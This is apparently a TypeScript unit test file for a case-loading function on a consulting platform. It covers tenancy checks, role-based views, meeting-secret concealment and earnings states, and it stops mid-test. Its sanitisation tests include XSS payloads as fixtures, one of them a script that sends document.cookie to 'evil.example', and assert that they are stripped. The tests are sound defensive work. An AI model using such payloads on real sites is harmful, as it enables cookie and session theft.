import { describe, it, expect, vi, beforeEach } from 'vitest';

/**
 * BAL-421 — unit tests for THE CASE SURFACE'S SINGLE LOADER.
 *
 * ⚠⚠ WHAT THIS FILE EXISTS TO PIN, IN ORDER OF IMPORTANCE:
 *
 *   1. THE TENANCY ORDER. `resolveCaseAccess` (membership) runs BEFORE
 *      `findByEngagementId` (case-type coherence), so the coherence check can never act as an
 *      EXISTENCE ORACLE. A cross-tenant id, a PROJECT engagement id and an unknown uuid must
 *      all produce the SAME `null` — and nothing below the gate may be read on a denial.
 *   2. THE LENS DISCRIMINANT. The client arm is CONSTRUCTED WITHOUT an `earnings` field and
 *      the expert arm without `canClose`, so neither is one bug away from carrying the other's
 *      data. `Object.hasOwn` is asserted, not `undefined`-ness — an absent field and a
 *      present-but-undefined field are different, and only the first is structural.
 *   3. `descriptionHtml` IS SANITISED AT READ. `case_engagements.description` has NO enforced
 *      write-side sanitisation, and `CaseHeader` is a client component that structurally
 *      cannot sanitise, so this pass is the only thing between a future client-supplied
 *      description and stored XSS.
 *   4. NO MEETING SECRET CROSSES THE PROJECTION BOUNDARY. `listMeetingsForContext` returns FULL
 *      rows carrying `dailyRoomName` and `joinUrl`; the fixture seeds both so the assertion
 *      cannot pass vacuously.
 *   5. VISIBILITY IS WIDER THAN THE ACT. An agency colleague SEES the whole case but may not
 *      ask the client to resolve it — `canRequestResolution` carries the capability term.
 *
 * The mappers it composes (`mapCaseConsultations`, `mapMessageRowToView`,
 * `mapConversationFileRowToView`, `mapActionItemNode`, `loadCaseFiles`, `sanitizeProjectHtml`,
 * `selectCaseNudge`) are all REAL. Only `@balo/db`, the tenancy gate, the capability resolver
 * and the realtime config probe are mocked.
 */

const ENGAGEMENT_ID = 'e0000000-0000-4000-8000-000000000001';
const USER_ID = 'u0000000-0000-4000-8000-000000000002';
const COMPANY_ID = 'c0000000-0000-4000-8000-000000000003';
const PROFILE_ID = 'p0000000-0000-4000-8000-000000000004';
const CONVERSATION_ID = 'v0000000-0000-4000-8000-000000000005';
const EXPERT_USER_ID = 'x0000000-0000-4000-8000-000000000006';
const NOW = new Date('2026-08-12T12:00:00Z');

vi.mock('server-only', () => ({}));

/**
 * ⚠ `cache()` NEUTRALISED TO IDENTITY. React's per-request memo has no request scope in a unit
 * test; making it explicit keeps every `it` an independent read instead of depending on
 * whatever React does outside a render.
 */
vi.mock('react', async (importOriginal) => {
  const actual = await importOriginal<typeof import('react')>();
  return { ...actual, cache: <T>(fn: T): T => fn };
});

const m = {
  listMeetings: vi.fn(),
  listActionItems: vi.fn(),
  findCompany: vi.fn(),
  findProfile: vi.fn(),
  listMessagesPage: vi.fn(),
  listConversationFiles: vi.fn(),
  sumEarnings: vi.fn(),
  findUser: vi.fn(),
  findNames: vi.fn(),
  findAgency: vi.fn(),
  findCase: vi.fn(),
  findTranscripts: vi.fn(),
  listMeetingFiles: vi.fn(),
  findLiveProposals: vi.fn(),
  findProposalForAnswer: vi.fn(),
};

vi.mock('@balo/db', () => ({
  isTwoSidedParty: (party: unknown) => party === 'client' || party === 'expert',
  MEETING_FILE_LIST_LIMIT: 200,
  actionItemsRepository: { listByEngagement: (...a: unknown[]) => m.listActionItems(...a) },
  agenciesRepository: { getSummaryById: (...a: unknown[]) => m.findAgency(...a) },
  caseEngagementsRepository: { findByEngagementId: (...a: unknown[]) => m.findCase(...a) },
  companiesRepository: { findNameById: (...a: unknown[]) => m.findCompany(...a) },
  conversationsRepository: {
    listMessagesPage: (...a: unknown[]) => m.listMessagesPage(...a),
    listFiles: (...a: unknown[]) => m.listConversationFiles(...a),
  },
  creditSessionsRepository: {
    sumExpertEarningsForEngagement: (...a: unknown[]) => m.sumEarnings(...a),
  },
  expertsRepository: { findDisplayProfileById: (...a: unknown[]) => m.findProfile(...a) },
  meetingContextsRepository: { listMeetingsForContext: (...a: unknown[]) => m.listMeetings(...a) },
  meetingFilesRepository: { listByMeeting: (...a: unknown[]) => m.listMeetingFiles(...a) },
  rescheduleProposalsRepository: {
    findLivePendingByMeetingIds: (...a: unknown[]) => m.findLiveProposals(...a),
    findPendingForAnswer: (...a: unknown[]) => m.findProposalForAnswer(...a),
  },
  transcriptsRepository: { findByMeetingIds: (...a: unknown[]) => m.findTranscripts(...a) },
  usersRepository: {
    findDisplayById: (...a: unknown[]) => m.findUser(...a),
    findNamesByIds: (...a: unknown[]) => m.findNames(...a),
  },
}));

const mockResolveCaseAccess = vi.fn();
vi.mock('@/lib/cases/resolve-case-access', () => ({
  resolveCaseAccess: (...a: unknown[]) => mockResolveCaseAccess(...a),
}));

const mockHasEngagementCapability = vi.fn();
vi.mock('@/lib/authz/engagement', () => ({
  hasEngagementCapability: (...a: unknown[]) => mockHasEngagementCapability(...a),
}));

const mockIsRealtimeConfigured = vi.fn();
vi.mock('@/lib/realtime/ably-server', () => ({
  isRealtimeConfigured: () => mockIsRealtimeConfigured(),
}));

import { loadCase } from './load-case';
import { log } from '@/lib/logging';
import type { CaseSurfaceView } from '@/lib/cases/case-view-types';

// ── fixtures ──────────────────────────────────────────────────────────────────────────────

interface Access {
  lens: 'client' | 'expert';
  engagementId: string;
  companyId: string;
  expertProfileId: string;
  engagementStatus: string;
  conversationId: string;
  conversationWritable: boolean;
}

function access(over: Partial<Access> = {}): Access {
  return {
    lens: 'client',
    engagementId: ENGAGEMENT_ID,
    companyId: COMPANY_ID,
    expertProfileId: PROFILE_ID,
    engagementStatus: 'active',
    conversationId: CONVERSATION_ID,
    conversationWritable: true,
    ...over,
  };
}

/**
 * ⚠ THE FIXTURE SEEDS THE SECRETS ON PURPOSE. `dailyRoomName` and `joinUrl` are what a full
 * `Meeting` row carries; without them in the fixture, "no secret crosses the boundary" would
 * pass vacuously.
 */
function meeting(id: string, over: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    id,
    status: 'ended',
    outcome: 'completed',
    scheduledStart: new Date('2026-07-29T04:00:00Z'),
    // BAL-409 — `selectNextScheduled` now reads `scheduledEnd` too (for the reschedule
    // dialog's duration pin), so every fixture needs one even where the test cares only
    // about `scheduledStart`. One hour, matching this file's other explicit durations.
    scheduledEnd: new Date('2026-07-29T05:00:00Z'),
    startedAt: new Date('2026-07-29T04:14:00Z'),
    endedAt: new Date('2026-07-29T04:59:00Z'),
    dailyRoomName: 'room-secret-abc',
    joinUrl: 'https://daily.co/room-secret-abc',
    ...over,
  };
}

/** A profile fat with columns a bare relational hydrate would return. */
const FAT_PROFILE = {
  userId: EXPERT_USER_ID,
  agencyId: null,
  type: 'freelancer',
  headline: 'Salesforce CPQ specialist',
  username: 'amara',
  rateCents: 33_700,
  // BAL-422 — already a NUMBER here: `findDisplayProfileById` parses the `numeric` column.
  ratingAverage: 4.3,
  ratingCount: 2,
};

const OPEN_CASE = {
  engagementId: ENGAGEMENT_ID,
  title: 'Flow interview loop',
  description: '<p>We need the approval flow reviewed.</p>',
  createdAt: new Date('2026-07-01T09:00:00Z'),
  closedAt: null,
  closeReason: null,
  resolutionRequestedAt: null,
};

function seed(over: { access?: Partial<Access>; caseRow?: Record<string, unknown> } = {}): void {
  vi.clearAllMocks();
  mockResolveCaseAccess.mockResolvedValue(access(over.access));
  mockHasEngagementCapability.mockResolvedValue(true);
  mockIsRealtimeConfigured.mockReturnValue(true);
  m.findCase.mockResolvedValue({ ...OPEN_CASE, ...over.caseRow });
  m.listMeetings.mockResolvedValue([meeting('m1')]);
  m.listActionItems.mockResolvedValue([]);
  m.findCompany.mockResolvedValue({ id: COMPANY_ID, name: 'Northwind Industrial' });
  m.findProfile.mockResolvedValue(FAT_PROFILE);
  m.listMessagesPage.mockResolvedValue({ messages: [], hasEarlier: false });
  m.listConversationFiles.mockResolvedValue([]);
  m.sumEarnings.mockResolvedValue({
    state: 'not_yet',
    finalizedSessionCount: 0,
    pendingSessionCount: 0,
    earningsAudMinor: null,
  });
  // ⚠ ID-AWARE: this repository answers for BOTH the viewer and the delivering expert, and a
  // single blanket value would make "the counterparty is named correctly" pass vacuously.
  m.findUser.mockImplementation((id: string) =>
    Promise.resolve(
      id === USER_ID
        ? { firstName: 'Dana', lastName: 'Whitfield', avatarUrl: null }
        : { firstName: 'Amara', lastName: 'Okafor', avatarUrl: null }
    )
  );
  m.findNames.mockResolvedValue([]);
  m.findAgency.mockResolvedValue(undefined);
  m.findTranscripts.mockResolvedValue(new Map());
  m.listMeetingFiles.mockResolvedValue([]);
  m.findLiveProposals.mockResolvedValue([]);
  m.findProposalForAnswer.mockResolvedValue(undefined);
}

/** Load and assert non-null, so each test can read the view without re-narrowing. */
async function loadOrThrow(): Promise<CaseSurfaceView> {
  const view = await loadCase(ENGAGEMENT_ID, USER_ID, NOW);
  if (view === null) throw new Error('expected the case to load');
  return view;
}

beforeEach(() => {
  seed();
});

// ── 1. the tenancy order ──────────────────────────────────────────────────────────────────

/**
 * ⚠⚠ STEP 2 SITS AFTER STEP 1 SO IT CAN NEVER BE AN EXISTENCE ORACLE. Both
 * `meeting_contexts.context_id` and `conversation_contexts.context_id` have NO FK and NO RLS,
 * so an unchecked id from the URL resolves to another tenant's rows and every read below would
 * return them verbatim.
 */
describe('loadCase — the tenancy order IS the contract', () => {
  it('runs the MEMBERSHIP gate first, and reads NOTHING when it denies', async () => {
    mockResolveCaseAccess.mockResolvedValue(null);

    expect(await loadCase(ENGAGEMENT_ID, USER_ID, NOW)).toBeNull();
    // Not merely "the coherence check did not run" — NO seam is touched at all.
    expect(m.findCase).not.toHaveBeenCalled();
    expect(m.listMeetings).not.toHaveBeenCalled();
    expect(m.listMessagesPage).not.toHaveBeenCalled();
    expect(m.listConversationFiles).not.toHaveBeenCalled();
  });

  it('passes the engagement id and viewer to the gate verbatim', async () => {
    await loadCase(ENGAGEMENT_ID, USER_ID, NOW);
    expect(mockResolveCaseAccess).toHaveBeenCalledWith(ENGAGEMENT_ID, USER_ID);
  });

  /**
   * ⚠⚠ THE ANTI-ORACLE ASSERTION. A stranger must not be able to distinguish "a project
   * engagement" from "someone else's case" from "no such uuid" by response alone.
   */
  it('gives a CROSS-TENANT id, a PROJECT engagement id and an UNKNOWN uuid the SAME null', async () => {
    // Cross-tenant / no-capability: the gate refuses.
    seed();
    mockResolveCaseAccess.mockResolvedValue(null);
    const crossTenant = await loadCase(ENGAGEMENT_ID, USER_ID, NOW);

    // A PROJECT engagement: the gate passes (it is a real engagement the viewer can reach),
    // but the case-type coherence check finds no `case_engagements` row.
    seed();
    m.findCase.mockResolvedValue(undefined);
    const projectEngagement = await loadCase(ENGAGEMENT_ID, USER_ID, NOW);

    // An unknown uuid: the gate refuses, indistinguishably from cross-tenant.
    seed();
    mockResolveCaseAccess.mockResolvedValue(null);
    const unknown = await loadCase('11111111-2222-4333-8444-555555555555', USER_ID, NOW);

    expect(crossTenant).toBeNull();
    expect(projectEngagement).toBeNull();
    expect(unknown).toBeNull();
  });

  it('reads no meeting or conversation row for a NON-case engagement', async () => {
    m.findCase.mockResolvedValue(undefined);
    expect(await loadCase(ENGAGEMENT_ID, USER_ID, NOW)).toBeNull();
    expect(m.listMeetings).not.toHaveBeenCalled();
    expect(m.listMessagesPage).not.toHaveBeenCalled();
  });

  it('scopes the meeting read to the CASE context and the gate-validated id', async () => {
    await loadOrThrow();
    expect(m.listMeetings).toHaveBeenCalledWith('case', ENGAGEMENT_ID);
  });

  it('reads the thread with the FULL scope, STATED rather than defaulted', async () => {
    await loadOrThrow();
    expect(m.listMessagesPage).toHaveBeenCalledWith({
      conversationId: CONVERSATION_ID,
      scope: { kind: 'full' },
      limit: 30,
    });
    expect(m.listConversationFiles).toHaveBeenCalledWith(CONVERSATION_ID, { kind: 'full' });
  });

  it('uses the conversation id FROM THE GATE, never the engagement id', async () => {
    seed({ access: { conversationId: 'gate-owned-conversation' } });
    await loadOrThrow();
    expect(m.listMessagesPage).toHaveBeenCalledWith(
      expect.objectContaining({ conversationId: 'gate-owned-conversation' })
    );
  });
});

// ── 2. the lens discriminant ──────────────────────────────────────────────────────────────

describe('loadCase — the lens is a DISCRIMINANT, not a flag', () => {
  it('CLIENT arm has NO earnings field at all, and carries canClose', async () => {
    const view = await loadOrThrow();
    expect(view.lens).toBe('client');
    // Structural absence, not `undefined` — a client-lens view cannot HOLD an earnings figure.
    expect(Object.hasOwn(view, 'earnings')).toBe(false);
    expect(Object.hasOwn(view, 'canRequestResolution')).toBe(false);
    expect(view).toMatchObject({ canClose: true });
  });

  it('never even READS the earnings aggregate on the client lens', async () => {
    await loadOrThrow();
    expect(m.sumEarnings).not.toHaveBeenCalled();
  });

  it('EXPERT arm has NO canClose — only a client may close a case (BAL-417)', async () => {
    seed({ access: { lens: 'expert' } });
    const view = await loadOrThrow();
    expect(view.lens).toBe('expert');
    expect(Object.hasOwn(view, 'canClose')).toBe(false);
    expect(Object.hasOwn(view, 'earnings')).toBe(true);
  });

  it('canClose is FALSE on a closed case — there is nothing left to close', async () => {
    seed({ caseRow: { closedAt: new Date('2026-08-01T00:00:00Z'), closeReason: 'resolved' } });
    const view = await loadOrThrow();
    expect(view).toMatchObject({ lens: 'client', canClose: false });
  });
});

/**
 * ⚠⚠ VISIBILITY IS DELIBERATELY WIDER THAN THE ACT (ADR-1046 §7). `resolveCaseAccess` admits
 * ANY live agency member, INCLUDING agency role `expert`; the ENGAGEMENT axis does not. Deriving
 * this flag from the lens alone rendered a button that always failed with a bare permission
 * error — the one dead-end CTA on a surface whose rule is "an absent action beats a dead one".
 */
describe('loadCase — canRequestResolution carries the CAPABILITY term, not just the lens', () => {
  it('is FALSE for an agency colleague who can SEE the case but lacks MANAGE_ENGAGEMENT', async () => {
    seed({ access: { lens: 'expert' } });
    mockHasEngagementCapability.mockResolvedValue(false);

    const view = await loadOrThrow();

    // They still get the WHOLE surface — visibility is not narrowed.
    expect(view).toMatchObject({ lens: 'expert', canRequestResolution: false });
    expect(view.header.title).toBe('Flow interview loop');
    expect(view.consultations).toHaveLength(1);
  });

  it('is TRUE for the delivering expert on an open, unasked case', async () => {
    seed({ access: { lens: 'expert' } });
    const view = await loadOrThrow();
    expect(view).toMatchObject({ canRequestResolution: true });
  });

  it('resolves the capability on the ENGAGEMENT axis, scoped to this case', async () => {
    seed({ access: { lens: 'expert' } });
    await loadOrThrow();
    expect(mockHasEngagementCapability).toHaveBeenCalledWith({ id: USER_ID }, 'manage_engagement', {
      contextType: 'case',
      contextId: ENGAGEMENT_ID,
    });
  });

  it('is FALSE on a CLOSED case, without resolving any capability', async () => {
    seed({
      access: { lens: 'expert' },
      caseRow: { closedAt: new Date('2026-08-01T00:00:00Z'), closeReason: 'resolved' },
    });
    const view = await loadOrThrow();
    expect(view).toMatchObject({ canRequestResolution: false });
    expect(mockHasEngagementCapability).not.toHaveBeenCalled();
  });

  it('is FALSE when a resolution has ALREADY been asked for — no second ask, and its OWN capability call is skipped', async () => {
    seed({
      access: { lens: 'expert' },
      caseRow: { resolutionRequestedAt: new Date('2026-08-10T00:00:00Z') },
    });
    const view = await loadOrThrow();
    expect(view).toMatchObject({ canRequestResolution: false });
    // `mayRequestResolution`'s OWN capability call is short-circuited by
    // `resolutionRequestedAt === null` being false, before it ever awaits — same as the CLOSED
    // case above. Fix round 1 item 18 added a SEPARATE `canManageReschedule` flag with a
    // DIFFERENT (broader) short-circuit condition (`isOpen` alone — Withdraw eligibility does
    // not care whether a resolution was already asked for), so on an OPEN case it legitimately
    // calls the capability once on its own; the case is open with no meeting seeded, so
    // `mayProposeReschedule`'s own call stays skipped (`nextScheduled !== null` is false).
    expect(mockHasEngagementCapability).toHaveBeenCalledTimes(1);
  });
});

// ── 3. sanitisation ───────────────────────────────────────────────────────────────────────

/**
 * ⚠⚠ LOAD-BEARING, NOT BELT-AND-BRACES. `case_engagements.description` has NO enforced
 * write-side sanitisation and `CaseHeader` is a client component that cannot sanitise, so this
 * server-side pass is the only guard between a future client-supplied description (BAL-400
 * booking) and stored XSS.
 */
describe('loadCase — descriptionHtml is SANITISED at read', () => {
  it('strips a <script> tag that a raw description carried', async () => {
    seed({
      caseRow: {
        description:
          '<p>Review this</p><script>fetch("https://evil.example?c="+document.cookie)</script>',
      },
    });
    const view = await loadOrThrow();

    expect(view.header.descriptionHtml).not.toContain('<script');
    expect(view.header.descriptionHtml).not.toContain('evil.example');
    // The legitimate content survives — this is sanitisation, not blanket escaping.
    expect(view.header.descriptionHtml).toContain('Review this');
  });

  it('strips an inline event handler while keeping the element', async () => {
    seed({ caseRow: { description: '<p onclick="steal()">Approval flow</p>' } });
    const view = await loadOrThrow();
    expect(view.header.descriptionHtml).not.toContain('onclick');
    expect(view.header.descriptionHtml).toContain('Approval flow');
  });

  it('strips a javascript: URL from a link', async () => {
    seed({ caseRow: { description: '<p><a href="javascript:alert(1)">click</a></p>' } });
    const view = await loadOrThrow();
    expect(view.header.descriptionHtml).not.toContain('javascript:');
  });
});

// ── 4. the projection boundary ────────────────────────────────────────────────────────────

/**
 * ⚠ NO MEETING ROW CROSSES TO THE CLIENT. `listMeetingsForContext` returns FULL rows carrying
 * `dailyRoomName` and `joinUrl`; they are consumed here and narrowed by `mapCaseConsultations`,
 * and never composed into the view.
 */
describe('loadCase — no meeting secret and no rate crosses the projection boundary', () => {
  it('omits dailyRoomName and joinUrl from the ENTIRE serialised view', async () => {
    const view = await loadOrThrow();
    const serialised = JSON.stringify(view);

    expect(serialised).not.toContain('room-secret-abc');
    expect(serialised).not.toContain('joinUrl');
    expect(serialised).not.toContain('dailyRoomName');
    // The consultation itself IS present, so the assertion is not passing by emptiness.
    expect(view.consultations).toHaveLength(1);
  });

  it('omits the UN-MARKED-UP consultant rate, which would leak the Balo margin', async () => {
    const view = await loadOrThrow();
    expect(JSON.stringify(view)).not.toContain('33700');
    expect(JSON.stringify(view)).not.toContain('rateCents');
  });

  it('gives each consultation only its narrowed row shape', async () => {
    const view = await loadOrThrow();
    const [row] = view.consultations;
    if (row === undefined) throw new Error('expected one consultation');
    expect([...Object.keys(row)].sort()).toEqual(
      [
        'actionItemCount',
        'durationMinutes',
        'fileCount',
        'hasRecording',
        'hasTranscript',
        'meetingId',
        'ordinal',
        'recapHref',
        'scheduledStartIso',
        'startedAtIso',
        'state',
      ].sort()
    );
  });
});

// ── 5. the assembled view ─────────────────────────────────────────────────────────────────

describe('loadCase — the header', () => {
  it('reports the open case with its counts and no closed note', async () => {
    m.listMeetings.mockResolvedValue([
      meeting('m1'),
      meeting('m2', { status: 'cancelled', outcome: null }),
    ]);
    const view = await loadOrThrow();
    expect(view.header).toMatchObject({
      title: 'Flow interview loop',
      isOpen: true,
      closeReason: null,
      closedAtIso: null,
      closedNote: null,
      consultationCount: 2,
      heldConsultationCount: 1,
      openedAtIso: OPEN_CASE.createdAt.toISOString(),
    });
  });

  it('names the DATE a manually resolved case was closed', async () => {
    const closedAt = new Date('2026-08-01T00:00:00Z');
    seed({ caseRow: { closedAt, closeReason: 'resolved' } });
    const view = await loadOrThrow();
    expect(view.header.isOpen).toBe(false);
    expect(view.header.closedAtIso).toBe(closedAt.toISOString());
    expect(view.header.closedNote).toContain('Everything here stays available.');
    expect(view.header.closedNote).not.toContain('automatically');
  });

  it('uses DIFFERENT copy for an auto-closed case — the two reasons stay distinct', async () => {
    const closedAt = new Date('2026-08-01T00:00:00Z');
    seed({ caseRow: { closedAt, closeReason: 'auto_inactive' } });
    const view = await loadOrThrow();
    expect(view.header.closedNote).toBe(
      'Closed automatically after 30 days without activity. Everything stays available.'
    );
  });
});

describe('loadCase — the counterparty, per lens', () => {
  it('CLIENT lens names the delivering expert and links to their profile', async () => {
    const view = await loadOrThrow();
    expect(view.party).toEqual({
      name: 'Amara Okafor',
      headline: 'Salesforce CPQ specialist',
      orgLabel: null,
      avatarUrl: null,
      initials: 'AO',
      bookAgainHref: '/experts/amara',
      // ⚠ BAL-422 — the client lens carries the delivering expert's REAL aggregate. Note
      // this is a `toEqual`, so it ALSO pins that `rateCents` (on FAT_PROFILE) never
      // reaches the party view: the exhaustive shape is the concealment assertion.
      ratingAverage: 4.3,
      ratingCount: 2,
    });
  });

  /** ⚠ NULL MEANS NO REVIEWS — never coalesced to 0, which would fabricate a bad score. */
  it('passes a null rating through as null for an unrated expert', async () => {
    m.findProfile.mockResolvedValue({ ...FAT_PROFILE, ratingAverage: null, ratingCount: 0 });
    const view = await loadOrThrow();
    expect(view.party.ratingAverage).toBeNull();
    expect(view.party.ratingCount).toBe(0);
  });

  /** ⚠ `expert_profiles.username` IS NULLABLE — a null username means NO CTA, never
   *  `/experts/null` and never a disabled button. */
  it('emits NO book-again CTA when the expert has no username', async () => {
    m.findProfile.mockResolvedValue({ ...FAT_PROFILE, username: null });
    const view = await loadOrThrow();
    expect(view.party.bookAgainHref).toBeNull();
  });

  it('shows the AGENCY as the org label when the expert delivers through one', async () => {
    m.findProfile.mockResolvedValue({ ...FAT_PROFILE, agencyId: 'agency-1', type: 'agency' });
    m.findAgency.mockResolvedValue({ id: 'agency-1', name: 'CloudPeak' });
    const view = await loadOrThrow();
    expect(view.party.orgLabel).toBe('CloudPeak');
    expect(view.header.counterpartyOrgLabel).toBe('CloudPeak');
  });

  /**
   * ⚠⚠ THE EXPERT LENS NAMES THE COMPANY, NOT A PERSON. Client-side rights sit on COMPANY
   * membership (ADR-1029) and survive individual departures; there is no `created_by_user_id`
   * on an engagement to name a single client person from anyway.
   */
  it('EXPERT lens names the client COMPANY, with no forward CTA', async () => {
    seed({ access: { lens: 'expert' } });
    const view = await loadOrThrow();
    expect(view.party).toEqual({
      name: 'Northwind Industrial',
      headline: null,
      orgLabel: null,
      avatarUrl: null,
      initials: 'NI',
      bookAgainHref: null,
      // ⚠⚠ NOTHING EVALUATIVE ON THE EXPERT LENS (BAL-422). FAT_PROFILE carries 4.3/2 and
      // NEITHER value survives this branch — the expert is not scoring the client, and the
      // delivering expert's own rating must not ride along onto the company card either.
      ratingAverage: null,
      ratingCount: 0,
    });
  });

  it('degrades a missing company to a neutral label rather than failing the load', async () => {
    seed({ access: { lens: 'expert' } });
    m.findCompany.mockResolvedValue(undefined);
    const view = await loadOrThrow();
    expect(view.party.name).toBe('the client');
  });

  it('degrades a missing expert user to a neutral person label', async () => {
    m.findUser.mockImplementation((id: string) =>
      Promise.resolve(
        id === USER_ID ? { firstName: 'Dana', lastName: 'Whitfield', avatarUrl: null } : undefined
      )
    );
    const view = await loadOrThrow();
    expect(view.party.name).toBe('An expert');
    expect(view.party.initials).toBe('AE');
  });

  it('resolves no agency at all for an INDEPENDENT expert', async () => {
    await loadOrThrow();
    expect(m.findAgency).not.toHaveBeenCalled();
  });

  it('names the viewer and the counterparty in the people list', async () => {
    const view = await loadOrThrow();
    expect(view.people).toEqual([
      { name: 'Dana Whitfield', isViewer: true },
      { name: 'Amara Okafor', isViewer: false },
    ]);
  });

  it('falls back to "You" when the viewer has no name on file', async () => {
    m.findUser.mockImplementation((id: string) =>
      Promise.resolve(id === USER_ID ? undefined : { firstName: 'Amara', lastName: 'Okafor' })
    );
    const view = await loadOrThrow();
    expect(view.people).toContainEqual({ name: 'You', isViewer: true });
  });
});

describe('loadCase — the earnings aggregate stays a DISCRIMINATED state, never a flat zero', () => {
  it('keeps not_yet distinct from a real zero — nothing writes engagement_id yet', async () => {
    seed({ access: { lens: 'expert' } });
    const view = await loadOrThrow();
    expect(view).toMatchObject({
      earnings: { state: 'not_yet', earningsAudMinor: null, finalizedCount: 0, pendingCount: 0 },
    });
  });

  it('reports pending WITHOUT a figure — a money claim needs a finalized session', async () => {
    seed({ access: { lens: 'expert' } });
    m.sumEarnings.mockResolvedValue({
      state: 'pending',
      finalizedSessionCount: 0,
      pendingSessionCount: 3,
      earningsAudMinor: null,
    });
    const view = await loadOrThrow();
    expect(view).toMatchObject({
      earnings: { state: 'pending', earningsAudMinor: null, pendingCount: 3 },
    });
  });

  it('passes a FINALIZED figure through, including a legitimate zero', async () => {
    seed({ access: { lens: 'expert' } });
    m.sumEarnings.mockResolvedValue({
      state: 'finalized',
      finalizedSessionCount: 2,
      pendingSessionCount: 1,
      earningsAudMinor: 0,
    });
    const view = await loadOrThrow();
    expect(view).toMatchObject({
      earnings: {
        state: 'finalized',
        earningsAudMinor: 0,
        finalizedCount: 2,
        pendingCount: 1,
      },
    });
  });

  it('degrades a null aggregate to the EMPTY state, never a fabricated zero figure', async () => {
    seed({ access: { lens: 'expert' } });
    m.sumEarnings.mockResolvedValue(null);
    const view = await loadOrThrow();
    expect(view).toMatchObject({ earnings: { state: 'not_yet', earningsAudMinor: null } });
  });
});

describe('loadCase — the nudge', () => {
  it('names the SOONEST still-expected consultation, breaking ties on id', async () => {
    m.listMeetings.mockResolvedValue([
      meeting('m-late', {
        status: 'scheduled',
        outcome: null,
        startedAt: null,
        scheduledStart: new Date('2026-09-01T10:00:00Z'),
      }),
      meeting('m-soon', {
        status: 'scheduled',
        outcome: null,
        startedAt: null,
        scheduledStart: new Date('2026-08-20T10:00:00Z'),
      }),
    ]);
    const view = await loadOrThrow();
    expect(view.nudge).toMatchObject({ kind: 'upcoming', meetingId: 'm-soon' });
  });

  /** ⚠ `in_progress` COUNTS: a call happening RIGHT NOW is the most urgent thing the header
   *  can say. Excluding it would show "Nothing booked yet" to two people mid-consultation. */
  it('treats an IN-PROGRESS call as the upcoming consultation, and marks it live', async () => {
    m.listMeetings.mockResolvedValue([
      meeting('m-live', {
        status: 'in_progress',
        outcome: null,
        scheduledStart: new Date('2026-08-12T11:50:00Z'),
        startedAt: new Date('2026-08-12T11:51:00Z'),
      }),
    ]);
    const view = await loadOrThrow();
    expect(view.nudge).toMatchObject({ kind: 'upcoming', meetingId: 'm-live', live: true });
  });

  it('emits an ISO string, never a Date — the view must be serialisable', async () => {
    m.listMeetings.mockResolvedValue([
      meeting('m1', {
        status: 'scheduled',
        outcome: null,
        startedAt: null,
        scheduledStart: new Date('2026-08-20T10:00:00Z'),
      }),
    ]);
    const view = await loadOrThrow();
    if (view.nudge === null || view.nudge.kind !== 'upcoming') {
      throw new Error('expected an upcoming nudge');
    }
    expect(view.nudge.scheduledStartIso).toBe('2026-08-20T10:00:00.000Z');
  });

  it('nudges nothing-booked when every consultation is already behind us', async () => {
    const view = await loadOrThrow();
    expect(view.nudge).toEqual({ kind: 'nothing_booked' });
  });
});

/**
 * BAL-411 — the reschedule-proposal read, and the two new nudge arms it feeds. `selectCaseNudge`
 * and `deriveCaseConsultationState` are the REAL pure functions (only `@balo/db` is mocked), so
 * these tests pin the LOADER's wiring — that it reads `findLivePendingByMeetingIds`, derives
 * liveness itself via `rescheduleProposalIsLive`, and threads the SAME set into both the nudge
 * and the consultation row so the two can never disagree.
 */
describe('loadCase — the reschedule-proposal read (BAL-411)', () => {
  const SCHEDULED_START = new Date('2026-08-20T10:00:00Z');

  function scheduledMeeting(id = 'm1'): Record<string, unknown> {
    return meeting(id, {
      status: 'scheduled',
      outcome: null,
      startedAt: null,
      scheduledStart: SCHEDULED_START,
    });
  }

  function liveProposal(over: Record<string, unknown> = {}): Record<string, unknown> {
    return {
      proposalId: 'proposal-1',
      meetingId: 'm1',
      optionCount: 2,
      originalScheduledStart: SCHEDULED_START,
      expiresAt: new Date('2026-08-20T09:00:00Z'), // ahead of NOW (2026-08-12)
      ...over,
    };
  }

  it("reads proposals for the case's meeting ids", async () => {
    m.listMeetings.mockResolvedValue([scheduledMeeting()]);
    await loadOrThrow();
    expect(m.findLiveProposals).toHaveBeenCalledWith(['m1']);
  });

  const PROPOSAL_DETAIL = {
    proposal: { id: 'proposal-1', createdAt: new Date('2026-08-13T09:00:00Z') },
    options: [
      { id: 'opt-1', scheduledStart: new Date('2026-08-21T10:00:00Z') },
      { id: 'opt-2', scheduledStart: new Date('2026-08-22T10:00:00Z') },
    ],
  };

  it('CLIENT lens — a live proposal on the next meeting suppresses "upcoming"', async () => {
    m.listMeetings.mockResolvedValue([scheduledMeeting()]);
    m.findLiveProposals.mockResolvedValue([liveProposal()]);
    m.findProposalForAnswer.mockResolvedValue(PROPOSAL_DETAIL);

    const view = await loadOrThrow();

    expect(view.nudge).toEqual({
      kind: 'reschedule_proposal',
      proposalId: 'proposal-1',
      meetingId: 'm1',
      optionCount: 2,
      originalScheduledStartIso: SCHEDULED_START.toISOString(),
      expiresAtIso: '2026-08-20T09:00:00.000Z',
      proposedAtIso: '2026-08-13T09:00:00.000Z',
      options: [
        { optionId: 'opt-1', scheduledStartIso: '2026-08-21T10:00:00.000Z' },
        { optionId: 'opt-2', scheduledStartIso: '2026-08-22T10:00:00.000Z' },
      ],
    });
    expect(view.consultations[0]).toMatchObject({ state: 'pending_reschedule' });
  });

  it('EXPERT lens — the SAME live proposal renders reschedule_proposal_pending', async () => {
    seed({ access: { lens: 'expert' } });
    m.listMeetings.mockResolvedValue([scheduledMeeting()]);
    m.findLiveProposals.mockResolvedValue([liveProposal()]);
    m.findProposalForAnswer.mockResolvedValue(PROPOSAL_DETAIL);

    const view = await loadOrThrow();

    expect(view.nudge).toEqual({
      kind: 'reschedule_proposal_pending',
      proposalId: 'proposal-1',
      meetingId: 'm1',
      optionCount: 2,
      expiresAtIso: '2026-08-20T09:00:00.000Z',
      proposedAtIso: '2026-08-13T09:00:00.000Z',
      options: [
        { optionId: 'opt-1', scheduledStartIso: '2026-08-21T10:00:00.000Z' },
        { optionId: 'opt-2', scheduledStartIso: '2026-08-22T10:00:00.000Z' },
      ],
    });
  });

  it('an EXPIRED proposal (expiresAt <= now) is treated as absent — liveness derived HERE, not trusted from the row', async () => {
    m.listMeetings.mockResolvedValue([scheduledMeeting()]);
    m.findLiveProposals.mockResolvedValue([
      liveProposal({ expiresAt: new Date('2026-08-01T00:00:00Z') }), // before NOW
    ]);

    const view = await loadOrThrow();

